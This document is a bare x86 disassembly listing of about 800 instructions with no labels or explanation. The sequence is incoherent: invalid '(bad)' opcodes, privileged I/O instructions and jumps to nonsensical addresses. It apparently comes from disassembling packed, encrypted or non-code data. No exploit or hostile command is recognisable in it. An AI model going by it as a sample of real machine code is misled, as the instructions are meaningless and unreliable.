  431a57:	je     0x4319e2
  431a59:	jae    0x431a4d
  431a5b:	mov    ebx,0xcf810b25
  431a60:	pop    DWORD PTR [edx]
  431a62:	mov    ch,BYTE PTR [edi+0x7fce10a0]
  431a68:	adc    BYTE PTR [edx],al
  431a6a:	pop    ds
  431a6b:	aas    
  431a6c:	dec    eax
  431a6d:	retf   
  431a6e:	es dec ebp
  431a70:	lds    esp,FWORD PTR [edi]
  431a72:	les    eax,FWORD PTR [ecx-0x28]
  431a75:	dec    ebx
  431a76:	pop    ds
  431a77:	pop    esi
  431a78:	push   ebx
  431a79:	mov    ch,0xc1
  431a7b:	ret    
  431a7c:	sahf   
  431a7d:	out    0xf8,eax
  431a7f:	jge    0x431a2f
  431a81:	add    dh,dh
  431a83:	add    al,0x4e
  431a85:	mov    esi,0x258369c
  431a8a:	push   eax
  431a8b:	ins    BYTE PTR es:[edi],dx
  431a8c:	stos   DWORD PTR es:[edi],eax
  431a8d:	std    
  431a8e:	div    BYTE PTR [edx]
  431a90:	and    dl,BYTE PTR [edi+0x7203a51f]
  431a96:	fmul   QWORD PTR [esi-0x2d62c8aa]
  431a9c:	enter  0xd30d,0xdf
  431aa0:	cmp    cl,bh
  431aa2:	inc    eax
  431aa3:	sar    bl,1
  431aa5:	cmp    DWORD PTR [esi],ebx
  431aa7:	jmp    0x6de0e304
  431aac:	and    al,dh
  431aae:	ins    BYTE PTR es:[edi],dx
  431aaf:	aam    0x5d
  431ab1:	mov    esp,0x3c72c9b8
  431ab6:	mov    esp,ecx
  431ab8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431ab9:	jecxz  0x431a6c
  431abb:	clc    
  431abc:	ja     0x431ac1
  431abe:	ret    0x234b
  431ac1:	fwait
  431ac2:	jnp    0x431a59
  431ac4:	jp     0x431a66
  431ac6:	cmp    BYTE PTR [eax],0x88
  431ac9:	popf   
  431aca:	ss leave 
  431acc:	aas    
  431acd:	xchg   DWORD PTR [esi-0x69],eax
  431ad0:	call   0x41369ada
  431ad5:	mov    ds:0x6be00a90,eax
  431ada:	(bad)  
  431adb:	not    DWORD PTR [ebx]
  431add:	xchg   ebp,eax
  431ade:	add    esp,0xffffffe4
  431ae1:	and    al,0x9d
  431ae3:	xchg   esp,eax
  431ae4:	repz cmp ah,BYTE PTR [edi]
  431ae7:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  431ae9:	and    al,0x42
  431aeb:	dec    esi
  431aec:	ror    DWORD PTR [ebp+0x1f5a5561],1
  431af2:	aaa    
  431af3:	sub    al,0x79
  431af5:	adc    al,0x8
  431af7:	idiv   DWORD PTR [ecx]
  431af9:	jge    0x431aa5
  431afb:	scas   eax,DWORD PTR es:[edi]
  431afc:	dec    eax
  431afd:	push   ebx
  431afe:	pop    ds
  431aff:	mov    edi,0x93d7af
  431b04:	pusha  
  431b05:	and    eax,0x27bc2fb2
  431b0a:	loope  0x431b36
  431b0c:	or     al,cl
  431b0e:	imul   esp,DWORD PTR ds:0xd15dac55,0x7d
  431b15:	inc    ebp
  431b16:	push   ds
  431b17:	aam    0x5a
  431b19:	adc    al,0x4e
  431b1b:	dec    esi
  431b1c:	sub    eax,0xd1035203
  431b21:	rcl    BYTE PTR [eax+0x660e38a5],1
  431b27:	dec    ecx
  431b28:	push   ecx
  431b29:	std    
  431b2a:	push   0x56b2ad8d
  431b2f:	jmp    0x667f20e8
  431b34:	adc    BYTE PTR [ebp+0x69eb06a5],ah
  431b3a:	arpl   WORD PTR [edi+0x1df58a7f],bx
  431b40:	sbb    al,0x9c
  431b42:	pop    edx
  431b43:	and    DWORD PTR [ebp+0x2b98cf85],ebp
  431b49:	das    
  431b4a:	push   edx
  431b4b:	add    al,BYTE PTR [ebx+edi*4+0x6787d469]
  431b52:	and    eax,0x1f93c107
  431b57:	cmp    DWORD PTR [ebx],ebx
  431b59:	aaa    
  431b5a:	jle    0x431bcd
  431b5c:	shl    dl,1
  431b5e:	ja     0x431b34
  431b60:	or     bh,BYTE PTR [edi+0x41f4eca8]
  431b66:	loop   0x431afd
  431b68:	xchg   esi,eax
  431b69:	stc    
  431b6a:	mov    eax,gs:0x471f89db
  431b70:	mov    al,ds:0x3ab1f103
  431b75:	add    bh,BYTE PTR [edx+0x55]
  431b78:	inc    ebx
  431b79:	stc    
  431b7a:	mov    dl,0x98
  431b7c:	lock mov ebp,0x8e71a360
  431b82:	outs   dx,BYTE PTR ds:[esi]
  431b83:	add    al,0x6f
  431b85:	cmp    eax,0x726ddaba
  431b8a:	jmp    0x8e70:0xd4027af9
  431b91:	pusha  
  431b92:	mov    ds:0x608b82db,eax
  431b97:	stc    
  431b98:	jo     0x431b3b
  431b9a:	outs   dx,BYTE PTR ds:[esi]
  431b9b:	out    0x40,al
  431b9d:	cmc    
  431b9e:	repz aad 0x75
  431ba1:	lahf   
  431ba2:	aam    0x17
  431ba4:	les    edx,FWORD PTR [ebx+0x69]
  431ba7:	sbb    DWORD PTR [ecx+0x49bcb7ab],ecx
  431bad:	daa    
  431bae:	or     al,ch
  431bb0:	pop    edx
  431bb1:	add    eax,DWORD PTR [edx-0x13]
  431bb4:	or     BYTE PTR [esi+edx*1],bl
  431bb7:	inc    ebp
  431bb8:	push   edx
  431bb9:	pop    ebp
  431bba:	jg     0x431b88
  431bbc:	data16 sti 
  431bbe:	sub    bh,bh
  431bc0:	mov    DWORD PTR [ebx-0x715afd87],esp
  431bc6:	dec    ebp
  431bc7:	retf   0x2da5
  431bca:	into   
  431bcb:	or     BYTE PTR [eax+0x6ff1b67a],al
  431bd1:	cwde   
  431bd2:	pop    ds
  431bd3:	out    dx,eax
  431bd4:	push   es
  431bd5:	xchg   edi,eax
  431bd6:	cmp    bh,BYTE PTR [esp+ecx*2+0x32]
  431bda:	in     eax,0xd7
  431bdc:	ret    0x66f7
  431bdf:	int    0x84
  431be1:	retf   0x1c72
  431be4:	mov    ds:0xc4278ff3,eax
  431be9:	add    dh,BYTE PTR [edx+0x4d3e3585]
  431bef:	hlt    
  431bf0:	adc    eax,0xa5ca9af2
  431bf5:	add    eax,0xdeae412a
  431bfa:	ins    BYTE PTR es:[edi],dx
  431bfb:	nop
  431bfc:	fiadd  DWORD PTR [edi]
  431bfe:	jne    0x431ba7
  431c00:	mov    dh,0x62
  431c02:	and    ebp,DWORD PTR [edx-0x795399a4]
  431c08:	test   al,0x73
  431c0a:	or     esi,eax
  431c0c:	inc    eax
  431c0d:	or     DWORD PTR [ecx-0x2d],eax
  431c10:	push   eax
  431c11:	mov    WORD PTR [eax-0x45],ss
  431c14:	jo     0x431c6a
  431c16:	sysexit 
  431c18:	jl     0x431c96
  431c1a:	sbb    eax,0x6df075d8
  431c1f:	jno    0x431c81
  431c21:	mov    BYTE PTR [esi+0x5f64097c],dh
  431c27:	es jae 0x431c2c
  431c2a:	fidiv  WORD PTR [edi+0x295ae808]
  431c30:	jns    0x431c4f
  431c32:	push   ds
  431c33:	mov    cl,0x58
  431c35:	fisttp WORD PTR [edx]
  431c37:	and    dl,BYTE PTR [esi]
  431c39:	adc    BYTE PTR [edx+0x35cff8d3],bh
  431c3f:	(bad)  
  431c40:	jmp    0x431cb0
  431c42:	aas    
  431c43:	gs mov ch,0xfa
  431c46:	adc    eax,0x5c25898c
  431c4b:	mov    eax,0xeea195d1
  431c50:	outs   dx,DWORD PTR ds:[esi]
  431c51:	ret    
  431c52:	fldenv [esi+ebx*8-0x70]
  431c56:	sub    DWORD PTR [ecx-0x18f9a44c],eax
  431c5c:	adc    al,0x27
  431c5e:	mov    edx,DWORD PTR [eax+eax*1]
  431c61:	(bad)  
  431c62:	(bad)  
  431c63:	and    al,0x79
  431c65:	add    bh,dh
  431c67:	push   edx
  431c68:	xchg   ecx,eax
  431c69:	xchg   esi,eax
  431c6a:	add    edx,eax
  431c6c:	mov    ah,0xd0
  431c6e:	pop    ds
  431c6f:	mov    cl,0xf1
  431c71:	scas   al,BYTE PTR es:[edi]
  431c72:	cmp    edi,edi
  431c74:	fcmovbe st,st(4)
  431c76:	jge    0x431c16
  431c78:	and    eax,0x3154667c
  431c7d:	test   DWORD PTR [esi],eax
  431c7f:	jno    0x431c99
  431c81:	inc    eax
  431c82:	push   ds
  431c83:	fistp  WORD PTR [eax-0x32]
  431c86:	ret    
  431c87:	shl    DWORD PTR [edx-0x3a2a6f12],0x33
  431c8e:	push   eax
  431c8f:	mov    eax,ds:0x880bf053
  431c95:	push   edi
  431c96:	xchg   edx,eax
  431c97:	add    eax,0x29cc0e43
  431c9c:	dec    esp
  431c9d:	add    esp,DWORD PTR [edx+edx*4+0x4ec468eb]
  431ca4:	push   0x68cb20fd
  431ca9:	ficomp DWORD PTR [eax+0x3d]
  431cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cad:	jg     0x431c4d
  431caf:	test   DWORD PTR [esi-0x7f61e47],ecx
  431cb5:	adc    al,0x78
  431cb7:	fwait
  431cb8:	fwait
  431cb9:	xor    edi,edi
  431cbb:	mov    ah,BYTE PTR [esi-0x57e49364]
  431cc1:	dec    edx
  431cc2:	fsub   st,st(0)
  431cc4:	mov    ebp,esp
  431cc6:	sbb    eax,esp
  431cc8:	fcmovu st,st(5)
  431cca:	or     edi,DWORD PTR [edx+0x1d]
  431ccd:	add    ecx,esi
  431ccf:	clc    
  431cd0:	and    DWORD PTR ds:0xca594673,0x17713f6d
  431cda:	push   ebp
  431cdb:	add    ebx,ebp
  431cdd:	rcr    dl,0x86
  431ce0:	call   0x7a18fdba
  431ce5:	xchg   ah,ch
  431ce7:	in     eax,0x89
  431ce9:	(bad)  
  431cea:	xchg   BYTE PTR [ebx-0x4b],cl
  431ced:	(bad)  
  431cef:	push   ecx
  431cf0:	push   es
  431cf1:	mov    edi,0x8c6a700a
  431cf6:	mov    bh,0xfb
  431cf8:	pusha  
  431cf9:	mov    ch,0xf0
  431cfb:	mov    edx,0x904869de
  431d00:	or     BYTE PTR [ecx],dl
  431d02:	push   ss
  431d03:	dec    esp
  431d04:	pop    eax
  431d05:	push   ss
  431d06:	mov    fs:0xcf658dc3,eax
  431d0c:	nop
  431d0d:	add    eax,0x1f825037
  431d12:	sar    BYTE PTR [ecx-0x68499a75],cl
  431d18:	leave  
  431d19:	cmp    BYTE PTR [edx-0x5],ch
  431d1c:	(bad)  
  431d1d:	push   edi
  431d1e:	mov    ecx,0x5ac39def
  431d23:	aam    0x48
  431d25:	pop    edi
  431d26:	push   ds
  431d27:	mov    BYTE PTR [esi],ah
  431d29:	int    0x62
  431d2b:	aam    0x69
  431d2d:	inc    ecx
  431d2e:	hlt    
  431d2f:	mov    ah,0x45
  431d31:	pop    ds
  431d32:	out    0x25,ax
  431d35:	jge    0x431d72
  431d37:	mov    eax,0xc430db08
  431d3c:	add    DWORD PTR [edx],0xffffffc8
  431d3f:	popa   
  431d40:	jno    0x431d53
  431d42:	cld    
  431d43:	arpl   WORD PTR [ebx],bp
  431d45:	hlt    
  431d46:	pop    ebx
  431d47:	sti    
  431d48:	pop    es
  431d49:	inc    eax
  431d4a:	data16 mov cl,0x62
  431d4d:	dec    edi
  431d4e:	lahf   
  431d4f:	ds in  al,0xb9
  431d52:	leave  
  431d53:	aam    0x4b
  431d55:	xor    eax,esi
  431d57:	xor    ah,BYTE PTR [ecx+0x27]
  431d5a:	sar    BYTE PTR [edi],1
  431d5c:	mov    BYTE PTR [ecx-0x39b063df],dl
  431d62:	aad    0x86
  431d64:	in     al,dx
  431d65:	dec    eax
  431d66:	not    BYTE PTR [eax+ebx*4]
  431d69:	test   DWORD PTR [edi],eax
  431d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431d6c:	inc    eax
  431d6d:	add    BYTE PTR [edi-0x75],al
  431d70:	mov    bl,dh
  431d72:	jnp    0x431d70
  431d74:	sbb    DWORD PTR [eax+0x2b6caa0],edx
  431d7a:	sub    BYTE PTR [ebx],ah
  431d7c:	ins    BYTE PTR es:[edi],dx
  431d7d:	and    BYTE PTR [edi],dh
  431d7f:	mov    ?,edi
  431d81:	js     0x431da2
  431d83:	and    esi,DWORD PTR [eax+0x9]
  431d86:	push   edi
  431d87:	inc    ecx
  431d88:	adc    al,0x75
  431d8a:	and    esi,DWORD PTR [edi+0x75]
  431d8d:	add    eax,DWORD PTR [eax+0x37c8c7a4]
  431d93:	jno    0x431db0
  431d95:	jg     0x431db6
  431d97:	push   ecx
  431d98:	push   0x38
  431d9a:	test   BYTE PTR ds:0xd7100b12,bl
  431da0:	jae    0x431d52
  431da2:	in     eax,0x7e
  431da4:	push   ebp
  431da5:	sbb    DWORD PTR [ebp-0x65067730],eax
  431dab:	pop    esp
  431dac:	popa   
  431dad:	sub    eax,0x59bcc29
  431db2:	sub    dl,BYTE PTR [esi]
  431db4:	out    0x8f,eax
  431db6:	mov    bl,0xad
  431db8:	cmp    DWORD PTR [esi],esp
  431dba:	pop    ds
  431dbb:	(bad)  
  431dbc:	mov    edx,0xc1f6b64f
  431dc1:	sbb    dl,BYTE PTR [esi-0x27]
  431dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431dc5:	add    ah,BYTE PTR [edx+ecx*8+0x38ea24ca]
  431dcc:	xor    BYTE PTR [edi+0x1e],ch
  431dcf:	push   ebp
  431dd0:	test   BYTE PTR [ebp+eiz*1+0xd],al
  431dd4:	pushf  
  431dd5:	(bad)  
  431dd6:	or     esp,edx
  431dd8:	jae    0x431db2
  431dda:	test   al,0x1b
  431ddc:	stos   DWORD PTR es:[edi],eax
  431ddd:	jns    0x431e4b
  431ddf:	xor    edx,DWORD PTR [ebp-0x14e050d9]
  431de5:	lds    esi,FWORD PTR [ebx-0x19]
  431de8:	(bad)  
  431dea:	push   0xffffffd4
  431dec:	icebp  
  431ded:	jl     0x431e6d
  431def:	jmp    0x8f59e609
  431df4:	mov    DWORD PTR [ebx],eax
  431df6:	pop    esp
  431df7:	fdiv   QWORD PTR [eax]
  431df9:	sub    ebx,0x19
  431dfc:	pop    esi
  431dfd:	add    esp,DWORD PTR [edx-0x22]
  431e00:	cdq    
  431e01:	mov    bl,0x3b
  431e03:	add    al,0x3b
  431e05:	and    eax,0xad6d9f1f
  431e0a:	shl    DWORD PTR [ebx-0x28f17e20],0x45
  431e11:	aam    0xa5
  431e13:	daa    
  431e14:	test   edx,ebx
  431e16:	mov    eax,0xde6389fb
  431e1b:	das    
  431e1c:	jo     0x431e4f
  431e1e:	mov    ds:0xb205e2f4,eax
  431e23:	sbb    DWORD PTR [eax+0x19fe4df5],esi
  431e29:	sbb    al,0xe
  431e2b:	shl    DWORD PTR [edx-0x32],0x60
  431e2f:	in     eax,0xce
  431e31:	push   edx
  431e32:	aas    
  431e33:	mov    ds:0xf03d2e5b,al
  431e38:	psadbw mm3,QWORD PTR [ebx*2-0x2f70b67d]
  431e40:	mov    dh,dl
  431e42:	ja     0x431e84
  431e44:	cmp    ebp,ecx
  431e46:	cmp    BYTE PTR [esi-0x78],0x8b
  431e4a:	dec    edi
  431e4b:	and    edx,DWORD PTR [edi+0x28e1fceb]
  431e51:	add    dl,BYTE PTR [edx+esi*4+0x48]
  431e55:	or     eax,0x4a0c7c18
  431e5a:	gs dec edi
  431e5c:	aam    0x1b
  431e5e:	pop    ecx
  431e5f:	sti    
  431e60:	test   edx,edx
  431e62:	dec    eax
  431e63:	ins    DWORD PTR es:[edi],dx
  431e64:	fst    DWORD PTR [edx+0x4a]
  431e67:	xor    eax,0x5952015d
  431e6c:	jae    0x431eb1
  431e6e:	hlt    
  431e6f:	cmp    BYTE PTR [edx-0x3f],ch
  431e72:	pop    edx
  431e73:	fdivr  QWORD PTR [ebx+0x7ee71f5f]
  431e79:	jbe    0x431eb5
  431e7b:	out    dx,eax
  431e7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431e7d:	cmp    ebp,DWORD PTR [ebx]
  431e7f:	mov    ch,0xbf
  431e81:	outs   dx,BYTE PTR ds:[esi]
  431e82:	inc    esp
  431e83:	(bad)  
  431e84:	or     ebp,DWORD PTR [edx]
  431e86:	sahf   
  431e87:	sub    al,0xb0
  431e89:	int    0xfe
  431e8b:	pop    ecx
  431e8c:	mov    gs,ebx
  431e8e:	ds fmul st,st(2)
  431e91:	std    
  431e92:	test   esp,esp
  431e94:	lods   al,BYTE PTR ds:[esi]
  431e95:	mov    WORD PTR [ebp+0x37de6ed4],gs
  431e9b:	stos   DWORD PTR es:[edi],eax
  431e9c:	fst    DWORD PTR [eax+edx*1]
  431e9f:	dec    DWORD PTR [esi-0x6bda3989]
  431ea5:	shl    bl,1
  431ea7:	push   esp
  431ea8:	xor    BYTE PTR [ebp+0x54],ah
  431eab:	aam    0x35
  431ead:	leave  
  431eae:	add    al,0xad
  431eb0:	mul    DWORD PTR [edx-0x7276ecdd]
  431eb6:	cmp    BYTE PTR [edi],bh
  431eb8:	scas   eax,DWORD PTR es:[edi]
  431eb9:	data16 sahf 
  431ebb:	scas   eax,DWORD PTR es:[edi]
  431ebc:	pop    edx
  431ebd:	add    edx,DWORD PTR [edx-0x11]
  431ec0:	xor    cl,ah
  431ec2:	daa    
  431ec3:	and    ah,BYTE PTR [edx+0x5c1360ab]
  431ec9:	sub    al,0xb3
  431ecb:	stos   DWORD PTR es:[edi],eax
  431ecc:	scas   al,BYTE PTR es:[edi]
  431ecd:	in     al,dx
  431ece:	loop   0x431ea4
  431ed0:	jbe    0x431f13
  431ed2:	push   edi
  431ed3:	mov    edi,0x3d8fa50
  431ed8:	aam    0xd
  431eda:	retf   
  431edb:	cmp    DWORD PTR [ecx-0x471017b1],ecx
  431ee1:	je     0x431ec6
  431ee3:	int3   
  431ee4:	iret   
  431ee5:	add    dh,BYTE PTR [edx+0xc]
  431ee8:	out    0xd3,eax
  431eea:	mov    ah,0x88
  431eec:	scas   al,BYTE PTR es:[edi]
  431eed:	aaa    
  431eee:	push   ds
  431eef:	add    DWORD PTR [ecx-0x5b1c4a23],0xffffffd5
  431ef6:	jb     0x431eb0
  431ef8:	sbb    eax,0xe33407f
  431efd:	outs   dx,DWORD PTR ds:[esi]
  431efe:	(bad)  
  431eff:	xchg   esi,eax
  431f00:	lahf   
  431f01:	push   eax
  431f02:	mov    cs:0xa33cec84,eax
  431f08:	mov    BYTE PTR [edi+0x41],dh
  431f0b:	cmp    ah,BYTE PTR [eax]
  431f0d:	out    dx,al
  431f0e:	icebp  
  431f0f:	mov    ds:0x2f680350,al
  431f14:	or     edi,esi
  431f16:	ja     0x431f2e
  431f18:	neg    BYTE PTR [ebp+0x70108d1f]
  431f1e:	vpminsw xmm5,xmm1,xmm0
  431f22:	mov    ch,0xd5
  431f24:	retf   
  431f25:	mov    edi,0x8f0d4b84
  431f2a:	adc    DWORD PTR [ebp-0x78],ecx
  431f2d:	sbb    DWORD PTR [ebp+esi*8+0x66a9cc2c],ebx
  431f34:	dec    esp
  431f35:	and    esp,DWORD PTR [ebp+0x6b09fd4]
  431f3b:	hlt    
  431f3c:	fcomp  st(7)
  431f3e:	pop    ebx
  431f3f:	jnp    0x431ec9
  431f41:	out    0x43,eax
  431f43:	retf   
  431f44:	add    al,BYTE PTR ds:0x1d0a873f
  431f4a:	xchg   esp,eax
  431f4b:	mov    esi,0xea04f3ed
  431f50:	or     bh,ah
  431f52:	adc    ebp,DWORD PTR [eax]
  431f54:	mov    WORD PTR [ecx+0x65fb7b8f],ss
  431f5a:	outs   dx,BYTE PTR ds:[esi]
  431f5b:	loope  0x431f1f
  431f5d:	fisttp WORD PTR [ecx]
  431f5f:	addr16 call 0x658d:0x47d4a833
  431f67:	and    BYTE PTR [edi+ebp*2],dh
  431f6a:	inc    edx
  431f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f6c:	lahf   
  431f6d:	sbb    eax,DWORD PTR [edx+0x25032269]
  431f73:	daa    
  431f74:	jbe    0x431fdc
  431f76:	inc    esi
  431f77:	stos   BYTE PTR es:[edi],al
  431f78:	mov    BYTE PTR [eax],cl
  431f7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431f7b:	inc    eax
  431f7c:	push   ebx
  431f7d:	mov    ds:0x8c789475,eax
  431f82:	sbb    bh,BYTE PTR [ebp+esi*8-0x783a5021]
  431f89:	ror    DWORD PTR [eax],1
  431f8b:	push   ds
  431f8c:	jae    0x431fc8
  431f8e:	pop    esp
  431f8f:	adc    al,0x36
  431f91:	inc    esp
  431f92:	enter  0x7869,0x84
  431f96:	mov    ch,0x22
  431f98:	mov    BYTE PTR [ebx+ecx*8],cl
  431f9b:	test   DWORD PTR [ecx+0x64],eax
  431f9e:	out    dx,al
  431f9f:	push   ebx
  431fa0:	mov    ecx,edi
  431fa2:	jo     0x431f29
  431fa4:	into   
  431fa5:	sbb    BYTE PTR [ebx+edx*2+0xcca1479],0x9b
  431fad:	xchg   dh,dh
  431faf:	mov    dl,BYTE PTR [esi-0x1e]
  431fb2:	xor    DWORD PTR [edx-0x44],ebp
  431fb5:	jne    0x432018
  431fb7:	mov    bh,0x92
  431fb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431fba:	imul   edi,DWORD PTR [ebp-0x48d75fdc],0x66
  431fc1:	jo     0x432033
  431fc3:	sbb    eax,0x86d43f88
  431fc8:	shl    bl,1
  431fca:	add    edi,ebx
  431fcc:	mov    ecx,edx
  431fce:	ins    DWORD PTR es:[edi],dx
  431fcf:	scas   al,BYTE PTR es:[edi]
  431fd0:	add    ebp,eax
  431fd2:	mov    ah,0x2a
  431fd4:	popf   
  431fd5:	add    bh,BYTE PTR [edx+0x5d]
  431fd8:	and    al,0x1a
  431fda:	dec    esp
  431fdb:	test   DWORD PTR [ebx],esi
  431fdd:	xchg   esi,eax
  431fde:	pop    esi
  431fdf:	outs   dx,DWORD PTR ds:[esi]
  431fe0:	retf   0x6201
  431fe3:	aas    
  431fe4:	out    dx,al
  431fe5:	fidivr DWORD PTR [esi+edx*1+0x18ce1650]
  431fec:	cmp    BYTE PTR ds:0x3b2b31fe,ah
  431ff2:	lahf   
  431ff3:	push   ds
  431ff4:	(bad)  [eax-0x17]
  431ff7:	jge    0x431ff5
  431ff9:	jge    0x432052
  431ffb:	aad    0x2b
  431ffd:	adc    BYTE PTR [esi],ch
  431fff:	retf   
  432000:	(bad)  
  432001:	gs inc esp
  432003:	aad    0xa4
  432005:	pop    ss
  432006:	jb     0x432040
  432008:	sub    bh,BYTE PTR [ebx+0x36]
  43200b:	ror    BYTE PTR [ebx+0x3b0accc9],1
  432011:	pusha  
  432012:	cs and eax,0x9b5c8f58
  432018:	jne    0x43204f
  43201a:	mov    DWORD PTR [ebp+0x37],edx
  43201d:	jns    0x431fde
  43201f:	aad    0xf7
  432021:	pop    es
  432022:	fsub   st(3),st
  432024:	mov    DWORD PTR [edx+0x38],esi
  432027:	xor    al,BYTE PTR [ebp+0x3]
  43202a:	sbb    BYTE PTR [esi],dh
  43202c:	and    BYTE PTR [edx],bl
  43202e:	jno    0x432040
  432030:	fcomp  QWORD PTR [eax+0x1e]
  432033:	xchg   ebx,eax
  432034:	mov    bl,0xbf
  432036:	mov    eax,0x10b7aad1
  43203b:	shl    DWORD PTR [ecx+ebx*2-0x4469cac4],1
  432042:	fadd   QWORD PTR [ebx]
  432044:	stos   DWORD PTR es:[di],eax
  432046:	inc    eax
  432047:	xchg   BYTE PTR [eax+0xe94a3af],cl
  43204d:	add    eax,0x23bf622
  432052:	and    bl,BYTE PTR [ebp-0xe]
  432055:	dec    ebx
  432056:	pop    ebp
  432057:	or     esp,0x49
  43205a:	xchg   edi,eax
  43205b:	mov    ch,0x91
  43205d:	add    bh,BYTE PTR [edi-0x9198c76]
  432063:	sbb    ebp,DWORD PTR [ebp+0x2654b605]
  432069:	push   esp
  43206a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43206b:	aas    
  43206c:	xchg   ebx,eax
  43206d:	rcr    DWORD PTR [edi],1
  43206f:	jmp    0x4320b4
  432071:	xchg   edi,eax
  432072:	pop    eax
  432073:	jae    0x4320e3
  432075:	mov    dl,0xe5
  432077:	in     al,0xe8
  432079:	add    ch,BYTE PTR [esi]
  43207b:	popf   
  43207c:	xor    BYTE PTR [ebx+0x11],0xa4
  432080:	mov    esi,0x528f57b0
  432085:	test   BYTE PTR [edi+0x4e994bc],bl
  43208b:	lods   al,BYTE PTR ds:[esi]
  43208c:	add    DWORD PTR [ebx],eax
  43208e:	rcl    ah,1
  432090:	add    al,0x90
  432092:	or     edx,DWORD PTR [eax]
  432094:	loop   0x43207b
  432096:	(bad)  
  432097:	push   ss
  432098:	mov    edi,ebp
  43209a:	and    BYTE PTR [eax+0x47],dh
  43209d:	test   eax,0x5dcaf31
  4320a2:	ret    0x7235
  4320a5:	pop    ebx
  4320a6:	pop    ss
  4320a7:	push   eax
  4320a8:	add    esp,ecx
  4320aa:	pop    esi
  4320ab:	mov    edi,0x2a9e3719
  4320b0:	shl    BYTE PTR [ecx],1
  4320b2:	sbb    eax,0x25ff148a
  4320b7:	xlat   BYTE PTR ds:[ebx]
  4320b8:	loopne 0x43205f
  4320ba:	aad    0xd3
  4320bc:	jnp    0x43209c
  4320be:	stos   DWORD PTR es:[edi],eax
  4320bf:	loopne 0x432049
  4320c1:	cmc    
  4320c2:	sub    al,0xb3
  4320c4:	mov    al,0x40
  4320c6:	je     0x432147
  4320c8:	sti    
  4320c9:	sbb    al,0x0
  4320cb:	xchg   DWORD PTR [edi],esi
  4320cd:	call   0x36f:0x293990b4
  4320d4:	xchg   esi,eax
  4320d5:	adc    esi,DWORD PTR [esp+ebx*1+0x7b]
  4320d9:	inc    edx
  4320da:	aas    
  4320db:	js     0x4320dd
  4320dd:	sahf   
  4320de:	loope  0x4320b4
  4320e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4320e1:	ror    DWORD PTR [eax],0x63
  4320e4:	fist   WORD PTR [edi-0x327016bd]
  4320ea:	mov    ebp,0xfc217a89
  4320ef:	push   0x8
  4320f1:	xchg   DWORD PTR [eax-0x7fa2cef],edi
  4320f7:	mov    ebx,0xf93b1cc6
  4320fc:	add    edx,DWORD PTR [eax-0x1fb566e1]
  432102:	mov    ebp,DWORD PTR [ebx]
  432104:	and    al,BYTE PTR [edx-0x3cd5654b]
  43210a:	xlat   BYTE PTR ds:[ebx]
  43210b:	push   ebp
  43210c:	pop    ecx
  43210d:	sahf   
  43210e:	sbb    eax,0x604b487f
  432113:	lds    edi,FWORD PTR [esi+0x24c1a46]
  432119:	(bad)  
  43211b:	push   eax
  43211c:	test   DWORD PTR [ebp-0x1a],ecx
  43211f:	pop    esi
  432120:	inc    esp
  432121:	add    edi,DWORD PTR [ebx-0x5b]
  432124:	mov    gs,WORD PTR [edi-0x27]
  432127:	xor    eax,0x7f2de788
  43212c:	std    
  43212d:	(bad)  
  43212e:	and    dl,BYTE PTR [edx+0x58a00239]
  432134:	mov    al,BYTE PTR [edx]
  432136:	aad    0x29
  432138:	and    al,0x6d
  43213a:	xchg   ebp,eax
  43213b:	mov    edi,0x602202ab
  432140:	retf   0x610b
  432143:	test   DWORD PTR [ecx],esi
  432145:	add    al,dl
  432147:	and    al,0x70
  432149:	or     eax,0x436649e9
  43214e:	pop    ds
  43214f:	iret   
  432150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  432151:	lods   eax,DWORD PTR ds:[esi]
  432152:	add    DWORD PTR [esp+eax*2+0xed4442c],ebx
  432159:	sub    BYTE PTR [edi+eax*4],0x80
  43215d:	xchg   ebp,eax
  43215e:	ret    
  43215f:	sbb    DWORD PTR [eax-0x43104bf7],ecx
  432165:	pop    ds
  432166:	(bad)  
  432167:	mov    bl,0xf3
  432169:	add    eax,0xdce9a6c0
  43216e:	ja     0x432158
  432170:	mov    cl,0x59
  432172:	pop    ds
  432173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432174:	pop    esi
  432175:	test   al,0x4b
  432177:	jns    0x4321d3
  432179:	fdiv   DWORD PTR [eax-0x2b]
  43217c:	shl    dl,1
  43217e:	out    0xb9,eax
  432180:	pop    ds
  432181:	scas   eax,DWORD PTR es:[edi]
  432182:	inc    esi
  432183:	pop    ebp
  432184:	mov    DWORD PTR [ebx],eax
  432186:	loop   0x4321a1
  432188:	lea    ebx,[ebp-0x1939b300]
  43218e:	xlat   BYTE PTR ds:[ebx]
  432190:	sbb    al,BYTE PTR [eax+0x36b9017c]
  432196:	aam    0x44
  432198:	sti    
  432199:	xchg   ebp,eax
  43219a:	mov    BYTE PTR [ebp+0x29],ch
  43219d:	pop    esi
  43219e:	pop    ds
  43219f:	(bad)  [ebp+edx*2-0x1]
  4321a3:	pop    esp
  4321a4:	jmp    0x3a4f:0x106c4402
  4321ab:	icebp  
  4321ac:	mov    DWORD PTR [edx],ecx
  4321ae:	mov    edi,0x89c78882
  4321b3:	push   edx
  4321b4:	into   
  4321b5:	ret    
  4321b6:	xchg   BYTE PTR [edx-0x4528f7f8],al
  4321bc:	in     al,dx
  4321bd:	push   ss
  4321be:	aam    0xee
  4321c0:	mov    eax,eax
  4321c2:	fld    DWORD PTR [ebp-0x60dd9e15]
  4321c8:	mov    al,0x99
  4321ca:	xor    al,BYTE PTR gs:[edx-0x763f873e]
  4321d1:	loopne 0x4321a6
  4321d3:	xchg   esp,eax
  4321d4:	push   ecx
  4321d5:	add    dl,BYTE PTR [eax+0x519c6412]
  4321db:	add    eax,DWORD PTR [edx+0xb496ec0]
  4321e1:	mov    ebp,DWORD PTR [eax]
  4321e3:	ret    
  4321e4:	xor    al,0x82
  4321e6:	pop    ds
  4321e7:	push   0xffffffae
  4321e9:	sbb    BYTE PTR [edi-0x2b],0xf6
